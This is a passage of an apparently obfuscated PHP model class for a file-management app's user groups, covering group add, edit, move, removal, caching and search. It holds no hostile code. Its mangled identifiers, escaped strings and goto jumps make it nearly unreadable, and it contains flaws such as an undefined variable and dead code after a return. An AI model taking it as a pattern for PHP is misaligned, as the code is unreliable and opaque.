Cache::clearMemory(Model($öæà²½Ï[510])->cacheKey($öæà²½Ï[1782])); Model($öæà²½Ï[1751])->cacheClear(); self::closeDatabase(); } } goto Dšğªå; Fˆ¨Š¦‘†: define($_SERVER[†ûãı«°][319], 3); define($_SERVER[†ûãı«°][320], 1); define($_SERVER[†ûãı«°][321], 0); goto F£ó¯Š‡Ò; EŠìÄàßÙ£: class GroupModel extends ModelBase { protected $tableName = "\x67\162\157\x75\x70"; protected $tableMeta = array("\164\x61\142\154\145\x4e\x61\155\145" => "\x67\162\157\x75\x70\x5f\x6d\145\164\x61", "\155\x65\164\x61\106\x69\145\154\x64" => "\147\x72\157\165\160\x49\x44"); protected function cacheFunctionAlias($åËÇİ“ï) { $¡õœ¯Œ =& $_SERVER[†ûãı«°]; return array($¡õœ¯Œ[2066] => array($åËÇİ“ï[0], $¡õœ¯Œ[2067]), $¡õœ¯Œ[2068] => array($åËÇİ“ï[0], $¡õœ¯Œ[2069])); } protected function getInfo($±ˆ‘Â½×, $Øê Øå = false) { $¿îéùéÍ = $this->getInfoSimple($±ˆ‘Â½×); if (!$¿îéùéÍ) { return !1; } if ($Øê Øå) { return $this->_listDataApplyItem($¿îéùéÍ); } return $this->cacheFunctionGet($_SERVER[†ûãı«°][2070], $±ˆ‘Â½×); } protected function getInfoSimple($âÕüµº“, $À€•ùÍ = false) { $”¨¾ü½Ÿ =& $_SERVER[†ûãı«°]; if ($À€•ùÍ) { $Èú ùÊÆ = array($”¨¾ü½Ÿ[1984] => intval($âÕüµº“)); $¹¶üãàİ = $this->where($Èú ùÊÆ)->find(); return is_array($¹¶üãàİ) ? $¹¶üãàİ : array(); } return $this->cacheFunctionGet($”¨¾ü½Ÿ[2071], $âÕüµº“); } protected function groupAdd($í©¾Øó ) { $•§¤û· =& $_SERVER[†ûãı«°]; if (!$í©¾Øó [$•§¤û·[192]] && isset($í©¾Øó [$•§¤û·[1984]]) && $í©¾Øó [$•§¤û·[1984]] == 1) { if ($ãâï‰ç = $this->getInfoSimple($í©¾Øó [$•§¤û·[1984]], !0)) { return $í©¾Øó [$•§¤û·[1984]]; } } else { $ãâï‰ç = $this->getInfoSimple($í©¾Øó [$•§¤û·[192]]); if (!$ãâï‰ç) { return !1; } } $ÄÕåĞİô = $•§¤û·[597]; if ($ãâï‰ç[$•§¤û·[588]]) { $ÄÕåĞİô = $ãâï‰ç[$•§¤û·[588]] . $ãâï‰ç[$•§¤û·[1984]] . $•§¤û·[50]; } $×Ì˜Î³ = array($•§¤û·[496] => $this->groupNameAuto($í©¾Øó [$•§¤û·[192]], $í©¾Øó [$•§¤û·[32]]), $•§¤û·[479] => $í©¾Øó [$•§¤û·[192]], $•§¤û·[659] => $ÄÕåĞİô, $•§¤û·[2072] => $í©¾Øó [$•§¤û·[1970]], $•§¤û·[2073] => 0, $•§¤û·[1988] => 0); if (isset($í©¾Øó [$•§¤û·[2008]])) { $×Ì˜Î³[$•§¤û·[2008]] = $í©¾Øó [$•§¤û·[2008]]; } else { $àÄ²ƒºÒ = $this->max($•§¤û·[2008]); if (!$àÄ²ƒºÒ) { $àÄ²ƒºÒ = 0; } $×Ì˜Î³[$•§¤û·[2008]] = $àÄ²ƒºÒ + 1; } if (!empty($í©¾Øó [$•§¤û·[1984]])) { $×Ì˜Î³[$•§¤û·[1984]] = $í©¾Øó [$•§¤û·[1984]]; } $…ìÅ• = $this->add($×Ì˜Î³); $this->setNamePinyin($…ìÅ•, $×Ì˜Î³[$•§¤û·[32]]); if (isset($í©¾Øó [$•§¤û·[2074]])) { $this->metaSet($…ìÅ•, array($•§¤û·[2074] => $í©¾Øó [$•§¤û·[2074]], $•§¤û·[2075] => $í©¾Øó [$•§¤û·[2075]])); unset($í©¾Øó [$•§¤û·[2074]]); unset($í©¾Øó [$•§¤û·[2075]]); } Model($•§¤û·[1432])->groupRootAdd($…ìÅ•); $this->_clearCache($í©¾Øó [$•§¤û·[192]]); return $…ìÅ•; } protected function groupEdit($¹Ò‹ôãÔ, $ÜÜó¥ÅÕ) { $Àš¼¢ıÅ =& $_SERVER[†ûãı«°]; $Ñê Úƒ† = $this->getInfoSimple($¹Ò‹ôãÔ); if (!$Ñê Úƒ†) { return !1; } if (!empty($ÜÜó¥ÅÕ[$Àš¼¢ıÅ[192]])) { $Äå›¦ = $this->getInfoSimple($ÜÜó¥ÅÕ[$Àš¼¢ıÅ[192]]); if (!$Äå›¦) { return !1; } if ($Ñê Úƒ†[$Àš¼¢ıÅ[1984]] == $Äå›¦[$Àš¼¢ıÅ[1984]]) { return !1; } if ($ÜÜó¥ÅÕ[$Àš¼¢ıÅ[192]] != $Ñê Úƒ†[$Àš¼¢ıÅ[192]]) { if ($Äå›¦[$Àš¼¢ıÅ[588]] !== $Ñê Úƒ†[$Àš¼¢ıÅ[588]] && strpos($Äå›¦[$Àš¼¢ıÅ[588]], $Ñê Úƒ†[$Àš¼¢ıÅ[588]] . $Ñê Úƒ†[$Àš¼¢ıÅ[1984]] . $Àš¼¢ıÅ[50]) === 0) { return !1; } $ÜÜó¥ÅÕ[$Àš¼¢ıÅ[659]] = $Äå›¦[$Àš¼¢ıÅ[588]] . $ÜÜó¥ÅÕ[$Àš¼¢ıÅ[192]] . $Àš¼¢ıÅ[50]; $this->_changeChildLevel($Ñê Úƒ†, $Äå›¦); $this->_clearCache($Äå›¦[$Àš¼¢ıÅ[1984]]); $this->_clearCache($Ñê Úƒ†[$Àš¼¢ıÅ[192]]); } } if (isset($ÜÜó¥ÅÕ[$Àš¼¢ıÅ[32]])) { $this->setNamePinyin($¹Ò‹ôãÔ, $ÜÜó¥ÅÕ[$Àš¼¢ıÅ[32]]); } if (isset($ÜÜó¥ÅÕ[$Àš¼¢ıÅ[2074]])) { $this->metaSet($¹Ò‹ôãÔ, array($Àš¼¢ıÅ[2074] => $ÜÜó¥ÅÕ[$Àš¼¢ıÅ[2074]], $Àš¼¢ıÅ[2075] => $ÜÜó¥ÅÕ[$Àš¼¢ıÅ[2075]])); unset($ÜÜó¥ÅÕ[$Àš¼¢ıÅ[2074]]); unset($ÜÜó¥ÅÕ[$Àš¼¢ıÅ[2075]]); } $this->_clearChildrenCache($Ñê Úƒ†); return $this->where(array($Àš¼¢ıÅ[2076] => $¹Ò‹ôãÔ))->save($ÜÜó¥ÅÕ); } private function _clearChildrenCache($›÷ıìË¾) { $ÑÅ³ÖÈ =& $_SERVER[†ûãı«°]; $ßÃÄ±À = array($ÑÅ³ÖÈ[659] => array($ÑÅ³ÖÈ[619], $›÷ıìË¾[$ÑÅ³ÖÈ[588]] . $›÷ıìË¾[$ÑÅ³ÖÈ[1984]] . $ÑÅ³ÖÈ[620])); $„¬»ÇóÒ = $this->field($ÑÅ³ÖÈ[1984])->where($ßÃÄ±À)->select(); foreach ($„¬»ÇóÒ as $½ŸÃåèÚ) { $this->_clearCache($½ŸÃåèÚ[$ÑÅ³ÖÈ[1984]]); } } private function _clearCache($Ùú¢­’‘) { $óš¦Ã²û =& $_SERVER[†ûãı«°]; $this->cacheFunctionClear($óš¦Ã²û[2070], $Ùú¢­’‘); $this->cacheFunctionClear($óš¦Ã²û[2071], $Ùú¢­’‘); } private function _changeChildLevel($§îŸ÷“ü, $½­Ÿ‰ş, $¡ì–Çªó = false) { $›ÖšÁÉÓ =& $_SERVER[†ûãı«°]; $›ó‘§· = $§îŸ÷“ü[$›ÖšÁÉÓ[588]] . $§îŸ÷“ü[$›ÖšÁÉÓ[1984]] . $›ÖšÁÉÓ[50]; $¢×òÙò» = $½­Ÿ‰ş[$›ÖšÁÉÓ[588]] . $½­Ÿ‰ş[$›ÖšÁÉÓ[1984]] . $›ÖšÁÉÓ[50] . $§îŸ÷“ü[$›ÖšÁÉÓ[1984]] . $›ÖšÁÉÓ[50]; if ($¡ì–Çªó) { $¢×òÙò» = $½­Ÿ‰ş[$›ÖšÁÉÓ[588]] . $½­Ÿ‰ş[$›ÖšÁÉÓ[1984]] . $›ÖšÁÉÓ[50]; } $Ò”ŒÊÅ = array($›ÖšÁÉÓ[659] => array($›ÖšÁÉÓ[619], $§îŸ÷“ü[$›ÖšÁÉÓ[588]] . $§îŸ÷“ü[$›ÖšÁÉÓ[1984]] . $›ÖšÁÉÓ[620])); $Şõ¼ïñ = array($›ÖšÁÉÓ[659] => array($›ÖšÁÉÓ[668], "\162\x65\x70\154\x61\143\145\x28\160\141\x72\145\156\164\114\x65\x76\x65\154\x2c\x27{$›ó‘§·}\x27\54\x27{$¢×òÙò»}\x27\x29")); $this->_clearChildrenCache($§îŸ÷“ü); $this->where($Ò”ŒÊÅ)->data($Şõ¼ïñ)->save(); } public function setNamePinyin($‡ñ»÷Æ, $ä‘¥¼ˆß = false) { $Ã“Üóî¯ =& $_SERVER[†ûãı«°]; if (!$ä‘¥¼ˆß) { $á÷ª®µ¹ = $this->getInfoSimple($‡ñ»÷Æ); $ä‘¥¼ˆß = $á÷ª®µ¹[$Ã“Üóî¯[32]]; } if (!Input::check($ä‘¥¼ˆß, $Ã“Üóî¯[662])) { $this->metaSet($‡ñ»÷Æ, $Ã“Üóî¯[540], null); $this->metaSet($‡ñ»÷Æ, $Ã“Üóî¯[539], null); return; } $ˆÜê·Šê = array($Ã“Üóî¯[540] => str_replace($Ã“Üóî¯[53], $Ã“Üóî¯[12], Pinyin::get($ä‘¥¼ˆß)), $Ã“Üóî¯[539] => Pinyin::get($ä‘¥¼ˆß, $Ã“Üóî¯[663])); $this->metaSet($‡ñ»÷Æ, $ˆÜê·Šê); } protected function metaSet($µˆÅÜÄò, $É„êÈ´’ = null, $’ÌËê«‘ = null) { $this->_clearCache($µˆÅÜÄò); return parent::metaSet($µˆÅÜÄò, $É„êÈ´’, $’ÌËê«‘); } protected function groupStatus($“ÉÁèñ, $”¹°÷¶Í) { $Îá¾×’„ =& $_SERVER[†ûãı«°]; $…‹«–Œ° = $this->getInfoSimple($“ÉÁèñ); if (!$…‹«–Œ°) { return !1; } $this->_clearCache($“ÉÁèñ); return $this->metaSet($“ÉÁèñ, $Îá¾×’„[826], $”¹°÷¶Í); if ($”¹°÷¶Í == $Îá¾×’„[91]) { $óºòØñ = $this->parentLevelArray($…‹«–Œ°[$Îá¾×’„[588]]); } else { } $óºòØñ[] = $…‹«–Œ°[$Îá¾×’„[1984]]; $éÖ–ô± = array(); foreach ($óºòØñ as $“ÉÁèñ) { $éÖ–ô±[] = array($Îá¾×’„[1984] => $“ÉÁèñ, $Îá¾×’„[97] => $Îá¾×’„[826], $Îá¾×’„[452] => $”¹°÷¶Í); $this->_clearCache($“ÉÁèñ); } return Model($Îá¾×’„[2077])->addAll($éÖ–ô±, array(), !0); } protected function groupRemove($•¹¯´Ë÷, $Ù‘Ì‹³­ = false) { $‚Öèß‡ =& $_SERVER[†ûãı«°]; $û‘Â·Èê = array($‚Öèß‡[1984] => $•¹¯´Ë÷); $‘§õ°õè = $this->where($û‘Â·Èê)->find(); if (!$‘§õ°õè || $‘§õ°õè[$‚Öèß‡[192]] == 0) { return !1; } if (!$Ù‘Ì‹³­) { $‚¦¥ÆÁ = $this->getInfoSimple($‘§õ°õè[$‚Öèß‡[192]]); $this->_changeChildLevel($‘§õ°õè, $‚¦¥ÆÁ, !0); $this->where(array($‚Öèß‡[192] => $•¹¯´Ë÷))->save(array($‚Öèß‡[192] => $‘§õ°õè[$‚Öèß‡[192]])); $this->_clearCache($‚¦¥ÆÁ[$‚Öèß‡[1984]]); } Model($‚Öèß‡[2077])->where($û‘Â·Èê)->delete(); Model($‚Öèß‡[2078])->where($û‘Â·Èê)->delete(); Model($‚Öèß‡[906])->groupRootRemove($•¹¯´Ë÷); $this->_clearCache($‘§õ°õè[$‚Öèß‡[192]]); return $this->where($û‘Â·Èê)->delete(); } protected function groupSort($¦ûÄˆ²ç) { $ô®ªïó =& $_SERVER[†ûãı«°]; $Šã´îß = array(); foreach ($¦ûÄˆ²ç as $Ñ•î£Ë => $œÈÕìÇ•) { $Šã´îß[] = array($ô®ªïó[1984], $œÈÕìÇ•, $ô®ªïó[2008], $Ñ•î£Ë + 1); } $this->saveAll($Šã´îß); } public function listData() { $‹œ³÷š = $this->_makeOrder()->selectPage(50); $this->_listDataApply($‹œ³÷š[$_SERVER[†ûãı«°][447]]); return $‹œ³÷š; } private function _makeOrder($èâ“ˆÌæ = '') { $úşÓèÌ¿ =& $_SERVER[†ûãı«°]; $”’Ø³˜ = array($úşÓèÌ¿[1984], $úşÓèÌ¿[32], $úşÓèÌ¿[1972], $úşÓèÌ¿[233]); $œîÁõú§ = array($úşÓèÌ¿[525] => $úşÓèÌ¿[526], $úşÓèÌ¿[527] => $úşÓèÌ¿[528]); $ÔÖÌ“ÚË = Input::get($úşÓèÌ¿[532], $úşÓèÌ¿[7], $úşÓèÌ¿[1988], $”’Ø³˜); $¾áªÑ¸ = Input::get($úşÓèÌ¿[533], $úşÓèÌ¿[7], $úşÓèÌ¿[2079], array($úşÓèÌ¿[2079], $úşÓèÌ¿[527])); $¾áªÑ¸ = $œîÁõú§[$¾áªÑ¸]; $èâ“ˆÌæ = $èâ“ˆÌæ . "{$ÔÖÌ“ÚË}\40{$¾áªÑ¸}\54\x20\147\162\157\165\x70\111\104\40\141\163\143"; return $this->order($èâ“ˆÌæ); } public function listChild($¯†™öí­) { $¾ì¾†Û =& $_SERVER[†ûãı«°]; $øŸï–¡‹ = $this->where(array($¾ì¾†Û[192] => $¯†™öí­))->_makeOrder()->selectPage(200); $this->_listDataApply($øŸï–¡‹[$¾ì¾†Û[447]]); return $øŸï–¡‹; } public function listChildIds($„¹„¯) { $·ƒŒó¦œ =& $_SERVER[†ûãı«°]; if (is_string($úûè£ûó)) { $„¹„¯ = explode($·ƒŒó¦œ[50], $„¹„¯); } $Î‘àÁ•Ê = $this->where(array($·ƒŒó¦œ[1984] => array($·ƒŒó¦œ[7], $„¹„¯)))->field($·ƒŒó¦œ[2080])->select(); if (!$Î‘àÁ•Ê) { return !1; } $ù¾æõøà = array(); foreach ($Î‘àÁ•Ê as $¬ï˜å›) { $ù¾æõøà[] = "\x73\x65\154\145\143\x74\40\x67\x72\157\165\x70\111\x44\x20\x66\162\157\x6d\x20\x60\x67\162\x6f\x75\x70\140\x20\167\150\x65\x72\x65\40\x70\141\162\145\x6e\164\114\145\166\x65\x6c\40\x6c\151\x6b\x65\40\47{$¬ï˜å›[$·ƒŒó¦œ[588]]}{$¬ï˜å›[$·ƒŒó¦œ[1984]]}\x2c\x25\x27"; } $ù¾æõøà = implode($·ƒŒó¦œ[2081], $ù¾æõøà); $Î‘àÁ•Ê = $this->query($ù¾æõøà); if (!$Î‘àÁ•Ê) { return array(); } $„¹„¯ = array_to_keyvalue($Î‘àÁ•Ê, $·ƒŒó¦œ[12], $·ƒŒó¦œ[1984]); return array_unique($„¹„¯); } public function listByID($üèÃ‰òƒ) { $»›ÎÇú± =& $_SERVER[†ûãı«°]; if (!$üèÃ‰òƒ) { return array(); } $õ´åşù = array($»›ÎÇú±[1984] => array($»›ÎÇú±[7], $üèÃ‰òƒ)); $€¼Íáğõ = $this->where($õ´åşù)->select(); $€¼Íáğõ = array_sort_keep($€¼Íáğõ, $»›ÎÇú±[1984], $üèÃ‰òƒ); $this->_listDataApply($€¼Íáğõ); return $€¼Íáğõ; } public function listSearch($ğÃí…Ìî) { $©œªŠóÅ =& $_SERVER[†ûãı«°]; $½ı©‡àì = trim($ğÃí…Ìî[$©œªŠóÅ[2082]]); $…¢¤ì¼† = explode($©œªŠóÅ[53], $½ı©‡àì); if (!$½ı©‡àì || count($…¢¤ì¼†) == 1) { return $this->listSearchNow($ğÃí…Ìî); } $…¡ÌŠ–‡ = array($©œªŠóÅ[447] => array()); foreach ($…¢¤ì¼† as $äº¥·¡³) { if (!trim($äº¥·¡³)) { continue; } $ğÃí…Ìî[$©œªŠóÅ[2082]] = $äº¥·¡³; $Ÿ–ï¼Ì¤ = $this->listSearchNow($ğÃí…Ìî); $…¡ÌŠ–‡[$©œªŠóÅ[447]] = array_merge($…¡ÌŠ–‡[$©œªŠóÅ[447]], $Ÿ–ï¼Ì¤[$©œªŠóÅ[447]]); } $…¡ÌŠ–‡[$©œªŠóÅ[447]] = array_unique_by_key($…¡ÌŠ–‡[$©œªŠóÅ[447]], $©œªŠóÅ[1984]); $…¡ÌŠ–‡[$©œªŠóÅ[444]] = array($©œªŠóÅ[445] => count($…¡ÌŠ–‡[$©œªŠóÅ[447]]), $©œªŠóÅ[441] => 20, $©œªŠóÅ[430] => 1, $©œªŠóÅ[446] => 1); return $…¡ÌŠ–‡; } public function listSearchNow($•ŒÀª¯æ) { $İÖîŒ°¥ =& $_SERVER[†ûãı«°]; $ÇßáÖú = trim($•ŒÀª¯æ[$İÖîŒ°¥[2082]]); $ûšê«¯ = isset($•ŒÀª¯æ[$İÖîŒ°¥[2083]]) ? $•ŒÀª¯æ[$İÖîŒ°¥[2083]] : !1; if (!trim($ÇßáÖú)) { return !1; } $ÇßáÖú = str_replace($İÖîŒ°¥[2084], $İÖîŒ°¥[2085], $ÇßáÖú); $ë¬Ô¦†Ì = array($İÖîŒ°¥[1984] => array($İÖîŒ°¥[461], "{$ÇßáÖú}\x25"), $İÖîŒ°¥[32] => array($İÖîŒ°¥[461], "\x25{$ÇßáÖú}\x25"), $İÖîŒ°¥[1088] => $İÖîŒ°¥[2086]); if ($ûšê«¯) { $úşµå¾¥ = $this->getInfoSimple($ûšê«¯); $ª¯Ò×•å = $úşµå¾¥[$İÖîŒ°¥[588]] . $ûšê«¯ . $İÖîŒ°¥[620]; $ë¬Ô¦†Ì = array($ë¬Ô¦†Ì, array($İÖîŒ°¥[588] => array($İÖîŒ°¥[461], $ª¯Ò×•å))); } $ë¬Ô¦†Ì = $this->parseWhereLike($ë¬Ô¦†Ì); $İÖö¦•Œ = $this->_makeOrder()->where($ë¬Ô¦†Ì)->selectPage(20); $İÖö¦•Œ = $İÖö¦•Œ ? $İÖö¦•Œ : array($İÖîŒ°¥[447] => array(), $İÖîŒ°¥[444] => array()); if (!$İÖö¦•Œ || count($İÖö¦•Œ[$İÖîŒ°¥[447]]) < 5 && Input::check($ÇßáÖú, $İÖîŒ°¥[395])) { $óïÊıãí = $this->groupChildrenAll($ûšê«¯); $İÃã’¾é = $this->_searchFromMeta($İÖîŒ°¥[539], $ÇßáÖú, 10, $óïÊıãí); $Û«¡Ì = $this->_searchFromMeta($İÖîŒ°¥[540], $ÇßáÖú, 10, $óïÊıãí); $™Ä¬£˜… = array_merge($İÃã’¾é, $Û«¡Ì, $İÖö¦•Œ[$İÖîŒ°¥[447]]); $İÖö¦•Œ[$İÖîŒ°¥[447]] = array_unique_by_key($™Ä¬£˜…, $İÖîŒ°¥[1984]); $İÖö¦•Œ[$İÖîŒ°¥[444]][$İÖîŒ°¥[445]] = count($İÖö¦•Œ[$İÖîŒ°¥[447]]); $İÖö¦•Œ[$İÖîŒ°¥[444]][$İÖîŒ°¥[446]] = ceil($İÖö¦•Œ[$İÖîŒ°¥[444]][$İÖîŒ°¥[445]] / $İÖö¦•Œ[$İÖîŒ°¥[444]][$İÖîŒ°¥[441]]); } $this->_listDataApply($İÖö¦•Œ[$İÖîŒ°¥[447]]); return $İÖö¦•Œ; } protected function groupChildrenAll($ÉîïŒ‰ö) { $¥€ÂÓœ =& $_SERVER[†ûãı«°]; if (!$ÉîïŒ‰ö) { return !1; } if (!is_array($ÉîïŒ‰ö)) { $ÉîïŒ‰ö = array($ÉîïŒ‰ö); } $ü–À‰¹¾ = $ÉîïŒ‰ö; foreach ($ÉîïŒ‰ö as $¢½•Å•Ë) { $š·ˆŞ„“ = $this->getInfoSimple($¢½•Å•Ë); $ı¤³ŸØÇ = array($¥€ÂÓœ[588] => array($¥€ÂÓœ[461], $š·ˆŞ„“[$¥€ÂÓœ[588]] . $¢½•Å•Ë . $¥€ÂÓœ[620])); $²ŞÓà²Ä = $this->field($¥€ÂÓœ[1984])->where($ı¤³ŸØÇ)->select(); $ü–À‰¹¾ = array_merge($ü–À‰¹¾, array_to_keyvalue($²ŞÓà²Ä, $¥€ÂÓœ[12], $¥€ÂÓœ[1984])); } return array_unique($ü–À‰¹¾); } private function _searchFromMeta($şùÒŠÌŒ, $©úƒ‹«¹, $­àèĞÕñ, $¨„ïÊıÓ) { $†•Ù¸¾ó =& $_SERVER[†ûãı«°]; $©úƒ‹«¹ = strtolower($©úƒ‹«¹); $Àİ÷ßï­ = array($†•Ù¸¾ó[97] => $şùÒŠÌŒ, $†•Ù¸¾ó[452] => array($†•Ù¸¾ó[461], "\x25{$©úƒ‹«¹}\45")); $Àİ÷ßï­ = $this->parseWhereLike($Àİ÷ßï­); if ($¨„ïÊıÓ) { $Àİ÷ßï­[$†•Ù¸¾ó[1984]] = array($†•Ù¸¾ó[7], $¨„ïÊıÓ); } $¦Ø€£Èš = Model($†•Ù¸¾ó[2087])->where($Àİ÷ßï­)->limit($­àèĞÕñ)->select(); if (!$¦Ø€£Èš) { return array(); } $¦Ø€£Èš = array_to_keyvalue($¦Ø€£Èš, $†•Ù¸¾ó[12], $†•Ù¸¾ó[1984]); $ÆÎ»Ãù¶ = $this->where(array($†•Ù¸¾ó[2076] => array($†•Ù¸¾ó[7], $¦Ø€£Èš)))->select(); if (!$ÆÎ»Ãù¶) { return array(); } return $ÆÎ»Ãù¶; } protected function _listDataApplyItem($¾ìøÏŞÉ) { $Üšµû† = array($¾ìøÏŞÉ); $this->_listDataApply($Üšµû†); return $Üšµû†[0]; } protected function _listDataApply(&$Â’àÅÄã) { $œĞÀíÙÀ =& $_SERVER[†ûãı«°]; if (!$Â’àÅÄã) { return; } $Ÿø¯ê§” = array_to_keyvalue($Â’àÅÄã, $œĞÀíÙÀ[12], $œĞÀíÙÀ[1984]); $this->_listAppendChildren($Â’àÅÄã); $this->_listAppendChildrenMember($Â’àÅÄã); $this->_listAppendMeta($Â’àÅÄã, $Ÿø¯ê§”); $this->_listAppendParent($Â’àÅÄã); $this->_listAppendSourceRoot($Â’àÅÄã, $Ÿø¯ê§”); } private function _listAppendChildren(&$’ì¥¿¸³) { $ïİø„èÅ =& $_SERVER[†ûãı«°]; $¥´Ù„ºõ = array_to_keyvalue($’ì¥¿¸³, $ïİø„èÅ[12], $ïİø„èÅ[1984]); $ËÇŸ„†Œ = array($ïİø„èÅ[192] => array($ïİø„èÅ[7], $¥´Ù„ºõ)); $í¨Äçªñ = array($ïİø„èÅ[192], $ïİø„èÅ[2088] => $ïİø„èÅ[569]); $Ïß°ùªŞ = $this->field($í¨Äçªñ)->where($ËÇŸ„†Œ)->group($ïİø„èÅ[192])->select(); $ê¼á–ô = array_to_keyvalue($Ïß°ùªŞ, $ïİø„èÅ[192], $ïİø„èÅ[569]); foreach ($’ì¥¿¸³ as &$Ø²™ù£µ) { $˜ïõ “å = $Ø²™ù£µ[$ïİø„èÅ[1984]]; $Ø²™ù£µ[$ïİø„èÅ[2089]] = isset($ê¼á–ô[$˜ïõ “å]) ? intval($ê¼á–ô[$˜ïõ “å]) : !1; } unset($Ø²™ù£µ); } private function _listAppendChildrenMember(&$‹Ó×çœÌ) { $õÓµ®î =& $_SERVER[†ûãı«°]; $æ»ôû¢ = array_to_keyvalue($‹Ó×çœÌ, $õÓµ®î[12], $õÓµ®î[1984]); $öì’ß©° = array($õÓµ®î[1984] => array($õÓµ®î[7], $æ»ôû¢)); $µ”¬òÙö = array($õÓµ®î[1984], $õÓµ®î[2088] => $õÓµ®î[569]); $œîƒ‚ = Model($õÓµ®î[2078])->field($µ”¬òÙö)->where($öì’ß©°)->group($õÓµ®î[1984])->select(); $…®¡Ç¤¬ = array_to_keyvalue($œîƒ‚, $õÓµ®î[1984], $õÓµ®î[569]); foreach ($‹Ó×çœÌ as &$Òİ°™†Ã) { $˜¡é§ ‹ = $Òİ°™†Ã[$õÓµ®î[1984]]; $Òİ°™†Ã[$õÓµ®î[2090]] = isset($…®¡Ç¤¬[$˜¡é§ ‹]) ? intval($…®¡Ç¤¬[$˜¡é§ ‹]) : !1; } unset($Òİ°™†Ã); } private function _listAppendMeta(&$¹ üÈ¦Ô, $Ê‡•Ùé›) { $ûã¢ÂØ =& $_SERVER[†ûãı«°]; $ÀßÒ¦Ùº = array($ûã¢ÂØ[1984] => array($ûã¢ÂØ[7], $Ê‡•Ùé›)); $³ªö£ = Model($ûã¢ÂØ[2077])->where($ÀßÒ¦Ùº)->select(); $³ªö£ = array_to_keyvalue_group($³ªö£, $ûã¢ÂØ[1984]); foreach ($³ªö£ as &$ö¯Şµş—) { $ö¯Şµş— = array_to_keyvalue($ö¯Şµş—, $ûã¢ÂØ[97], $ûã¢ÂØ[452]); } unset($ö¯Şµş—); foreach ($¹ üÈ¦Ô as &$“ÍÉÎ¤®) { $“ÍÉÎ¤®[$ûã¢ÂØ[543]] = array(); if (isset($³ªö£[$“ÍÉÎ¤®[$ûã¢ÂØ[1984]]])) { $“ÍÉÎ¤®[$ûã¢ÂØ[543]] = $³ªö£[$“ÍÉÎ¤®[$ûã¢ÂØ[1984]]]; } } unset($“ÍÉÎ¤®); } protected function parentLevelArray($¡úæ­¥á) { $Ö·í« =& $_SERVER[†ûãı«°]; $¡úæ­¥á = explode($Ö·í«[50], trim($¡úæ­¥á, $Ö·í«[50])); $¡úæ­¥á = array_remove_value($¡úæ­¥á, $Ö·í«[230]); return $¡úæ­¥á; } protected function parentInGroup($ş›áØØ, $€­Ûå) { $¯ıÀçî› =& $_SERVER[†ûãı«°]; $–£‚Ù¢Ì = $this->getInfoSimple($ş›áØØ); if (!$–£‚Ù¢Ì) { return !0; } $°£Ù¨‡¬ = $this->parentLevelArray($–£‚Ù¢Ì[$¯ıÀçî›[588]]); $°£Ù¨‡¬[] = $ş›áØØ; foreach ($°£Ù¨‡¬ as $ş›áØØ) { if (in_array($ş›áØØ . $¯ıÀçî›[12], $€­Ûå)) { return !0; } } return !1; } private function _listAppendParent(&$°¬Æè²‰) { $€Ê¤Òƒ =& $_SERVER[†ûãı«°]; $¥ª­Ç = array(); foreach ($°¬Æè²‰ as &$¨ÒŒÎ×) { $¥ª­Ç[$¨ÒŒÎ×[$€Ê¤Òƒ[1984]]] = $¨ÒŒÎ×[$€Ê¤Òƒ[32]]; $÷ü¤òÜ = $this->parentLevelArray($¨ÒŒÎ×[$€Ê¤Òƒ[588]]); foreach ($÷ü¤òÜ as $½í…ÕÜè) { if (!isset($¥ª­Ç[$½í…ÕÜè])) { $¥ª­Ç[$½í…ÕÜè] = 0; } } } unset($¨ÒŒÎ×); foreach ($¥ª­Ç as $’†áÏĞ˜ => $´øÛİ’¬) { if ($´øÛİ’¬) { continue; } $Œ…ù˜½’ = $this->getInfoSimple($’†áÏĞ˜); $¥ª­Ç[$’†áÏĞ˜] = $Œ…ù˜½’[$€Ê¤Òƒ[32]]; } $Ô¨ã‘±¤ = $GLOBALS[$€Ê¤Òƒ[6]][$€Ê¤Òƒ[92]][$€Ê¤Òƒ[2091]]; if (KodUser::isRoot()) { $Ô¨ã‘±¤ = !1; } foreach ($°¬Æè²‰ as &$¨ÒŒÎ×) { $÷ü¤òÜ = $this->parentLevelArray($¨ÒŒÎ×[$€Ê¤Òƒ[588]]); $èù©ğÛ÷ = $€Ê¤Òƒ[12]; foreach ($÷ü¤òÜ as $’†áÏĞ˜ => $½í…ÕÜè) { if ($Ô¨ã‘±¤ && $’†áÏĞ˜ == 0) { continue; } $èù©ğÛ÷ .= $¥ª­Ç[$½í…ÕÜè] . $€Ê¤Òƒ[8]; } if ($÷ü¤òÜ) { $èù©ğÛ÷ .= $¨ÒŒÎ×[$€Ê¤Òƒ[32]]; } $¨ÒŒÎ×[$€Ê¤Òƒ[593]] = str_replace($€Ê¤Òƒ[256], $€Ê¤Òƒ[8], $èù©ğÛ÷); } unset($¨ÒŒÎ×); } private function _listAppendSourceRoot(&$èÖØòû”, $©çøğÙ) { $Â ¸¬´ =& $_SERVER[†ûãı«°]; $ÛæÙ†Äê = Model($Â ¸¬´[906])->listSourceRoot(SourceModel::TYPE_GROUP, $©çøğÙ); $ÛæÙ†Äê = array_to_keyvalue($ÛæÙ†Äê, $Â ¸¬´[573]); $ÛæÙ†Äê = array_remove_key($ÛæÙ†Äê, $Â ¸¬´[573]); foreach ($èÖØòû” as &$—¥×¯Ğ°) { $—¥×¯Ğ°[$Â ¸¬´[90]] = $ÛæÙ†Äê[$—¥×¯Ğ°[$Â ¸¬´[1984]]] ? $ÛæÙ†Äê[$—¥×¯Ğ°[$Â ¸¬´[1984]]] : array(); } unset($—¥×¯Ğ°); } protected function groupMerge($Î‡ùÕ¸â) { $Î‡ùÕ¸â = array_values(array_unique($Î‡ùÕ¸â)); $ğÕÃ‰– = array(); for ($ğß£¤ä§ = 0; $ğß£¤ä§ < count($Î‡ùÕ¸â); $ğß£¤ä§++) { $Î·İ°·® = !1; for ($Ñ‡Öâ´ = 0; $Ñ‡Öâ´ < count($Î‡ùÕ¸â); $Ñ‡Öâ´++) { if ($ğß£¤ä§ == $Ñ‡Öâ´) { continue; } if ($this->isParentOf($Î‡ùÕ¸â[$Ñ‡Öâ´], $Î‡ùÕ¸â[$ğß£¤ä§])) { $Î·İ°·® = !0; break; } } if (!$Î·İ°·®) { $ğÕÃ‰–[] = $Î‡ùÕ¸â[$ğß£¤ä§]; } } return $ğÕÃ‰–; } protected function isParentOf($˜€Šúœ³, $Áö™®‚Ş) { $Ö­ïèö =& $_SERVER[†ûãı«°]; if (!$˜€Šúœ³ || !$Áö™®‚Ş || $˜€Šúœ³ == $Áö™®‚Ş) { return !1; } $ëó¸¦¯û = $this->getInfoSimple($˜€Šúœ³); $û†è¸ëÓ = $this->getInfoSimple($Áö™®‚Ş); $í‘‹Çğç = 